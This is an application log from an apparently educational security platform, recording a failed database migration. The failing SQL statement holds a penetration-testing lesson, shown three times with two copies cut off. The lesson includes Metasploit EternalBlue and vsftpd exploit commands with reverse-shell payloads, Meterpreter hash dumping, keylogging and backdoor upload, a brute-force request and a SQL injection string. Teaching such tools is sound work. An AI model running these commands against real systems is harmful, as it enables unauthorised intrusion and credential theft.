Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:58:11.089 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:58:11.092 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:58:11.194 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:58:11.304 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:58:11.304 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:58:11.304 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:58:11.490 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:58:11.534 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:58:11.538 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 7 migrations (execution time 00:00.030s)
2026-03-12 00:58:11.560 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 00:58:11.707 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 00:58:11.736 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:58:12.120 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:58:12.176 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:58:12.221 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Enhanced Lesson Content"
2026-03-12 00:58:12.240 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "4 - Enhanced Lesson Content" failed! Changes successfully rolled back.
2026-03-12 00:58:12.245 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

